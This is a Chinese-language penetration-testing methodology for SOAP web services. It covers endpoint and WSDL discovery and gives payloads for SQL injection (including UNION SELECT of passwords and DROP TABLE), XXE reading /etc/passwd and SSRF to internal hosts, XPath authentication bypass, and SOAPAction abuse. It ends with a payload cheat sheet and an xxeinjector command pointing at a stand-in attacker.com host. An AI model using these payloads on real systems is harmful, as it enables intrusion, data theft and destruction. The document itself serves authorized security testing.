# SOAP 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 SOAP Web Service 注入漏洞的系统化测试流程，覆盖 SOAP 注入、XXE、XPath 注入等 SOAP 特有的安全问题。

## 1.2 适用范围
适用于使用 SOAP Web Service 的企业应用、Web Service API，包括 Java JAX-WS、.NET WCF、PHP SOAP 等框架的应用系统。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：SOAP 应用注入系统化测试

### 2.1 技术介绍

SOAP 注入测试针对 SOAP Web Service 特有的漏洞类型，包括：
- **SOAP 注入**：类似 SQL 注入的消息注入
- **XXE 注入**：XML 外部实体注入
- **XPath 注入**：XPath 查询注入
- **SOAP Action 注入**：操作头注入
- **WSDL 信息泄露**：服务描述泄露

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **端点** | /soap、/ws、/service、/webservice |
| **注入类型** | SOAP 注入、XXE、XPath 注入 |
| **信息泄露** | WSDL、错误信息、Stack Trace |
| **认证/授权** | SOAP Header、WS-Security |

### 2.3 测试流程

#### 2.3.1 SOAP 端点发现

**端点探测：**
```
# 常见端点路径
/soap
/ws
/service
/webservice
/axis/services
/axis2/services
/wcf/service

# WSDL 文件
?wsdl
?WSDL
/service?wsdl
/wsdl

# 工具探测
gobuster dir -u http://target -w soap-endpoints.txt
wsdlfetch http://target/service?wsdl
```

**WSDL 分析：**
```bash
# 获取 WSDL 文件
curl http://target/service?wsdl

# 分析可用操作
- 查看 <operation> 标签
- 查看 <message> 标签
- 查看 <complexType> 定义
```

#### 2.3.2 信息收集

**WSDL 信息收集：**
```xml
<!-- WSDL 文件包含 -->
<wsdl:service name="UserService">
  <wsdl:operation name="getUser">
    <wsdl:input message="tns:getUserRequest"/>
    <wsdl:output message="tns:getUserResponse"/>
  </wsdl:operation>
</wsdl:service>
```

**SOAP 消息结构：**
```xml
<!-- 基础 SOAP 消息 -->
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser xmlns="http://example.com/">
      <userId>1</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

#### 2.3.3 注入测试

**SOAP 注入测试：**
```xml
<!-- 基础注入 -->
<soap:Body>
  <getUser xmlns="http://example.com/">
    <userId>1' OR '1'='1</userId>
  </getUser>
</soap:Body>

<!-- 联合查询 -->
<soap:Body>
  <getUser xmlns="http://example.com/">
    <userId>1' UNION SELECT password FROM users--</userId>
  </getUser>
</soap:Body>

<!-- 堆叠查询 -->
<soap:Body>
  <getUser xmlns="http://example.com/">
    <userId>1; DROP TABLE users--</userId>
  </getUser>
</soap:Body>
```

**XXE 注入测试：**
```xml
<!-- XXE 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE getUser [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser xmlns="http://example.com/">
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>

<!-- XXE SSRF -->
<!DOCTYPE getUser [
  <!ENTITY xxe SYSTEM "http://internal:8080/admin">
]>
<soap:Body>
  <getUser>
    <userId>&xxe;</userId>
  </getUser>
</soap:Body>
```

**XPath 注入测试：**
```xml
<!-- 认证绕过 -->
<soap:Body>
  <login>
    <username>' or '1'='1</username>
    <password>anything</password>
  </login>
</soap:Body>

<!-- 盲注 -->
<soap:Body>
  <login>
    <username>' and substring(//user[1]/username,1,1)='a</username>
    <password>test</password>
  </login>
</soap:Body>
```

**SOAP Action 注入：**
```
# SOAPAction 头注入
SOAPAction: "http://example.com/getUser"
SOAPAction: "http://example.com/adminFunction"

# 未授权访问
POST /service
SOAPAction: "http://example.com/deleteUser"
```

#### 2.3.4 错误信息探测

**触发错误：**
```xml
<!-- 类型不匹配 -->
<soap:Body>
  <getUser>
    <userId>invalid_type</userId>
  </getUser>
</soap:Body>

<!-- 观察错误响应 -->
<soap:Fault>
  <faultcode>soap:Server</faultcode>
  <faultstring>Invalid user ID</faultstring>
</soap:Fault>
```

### 2.4 测试用例清单

#### 2.4.1 Java JAX-WS 测试

```xml
<!-- XXE 测试 -->
<!DOCTYPE getUser [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Body>
  <getUser>
    <userId>&xxe;</userId>
  </getUser>
</soap:Body>

<!-- SQL 注入 -->
<userId>1' OR '1'='1</userId>
```

#### 2.4.2 .NET WCF 测试

```xml
<!-- XPath 注入 -->
<username>' or '1'='1</username>

<!-- SOAP Action 绕过 -->
SOAPAction: "http://tempuri.org/IService/AdminFunction"
```

#### 2.4.3 Apache Axis/Axis2 测试

```
# Axis2 管理界面
GET /axis2-admin
GET /axis2/services/listServices
```

### 2.5 自动化测试工具

#### 工具推荐

```bash
# SOAP 测试工具
soapui http://target/service?wsdl

# XXE 测试
xxeinjector --host=attacker.com --path=/service

# WSDL 分析
wsdlfetch http://target/service?wsdl
```

### 2.6 测试报告要点

测试完成后，报告应包含：
1. SOAP 端点和框架信息
2. WSDL 文件分析结果
3. 所有测试的 SOAP 消息
4. 发现的漏洞点及详情
5. XXE/XPath 注入风险
6. 修复建议

---

# 第三部分：附录

## 3.1 SOAP 注入 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **SQL 注入** | `<userId>1' OR '1'='1</userId>` | 基础注入 |
| **SQL 注入** | `<userId>1' UNION SELECT...--</userId>` | 联合查询 |
| **XXE** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 文件读取 |
| **XXE** | `<!ENTITY xxe SYSTEM "http://internal/admin">` | SSRF |
| **XPath** | `<username>' or '1'='1</username>` | 认证绕过 |
| **XPath** | `<username>' and substring(...)</username>` | 盲注 |

## 3.2 参考资源

- [OWASP Web Service Security](https://owasp.org/www-project-web-service-security/)
- [PortSwigger - XXE](https://portswigger.net/web-security/xxe)
- [WS-Attacker Project](https://github.com/RUB-NDS/WS-Attacker)
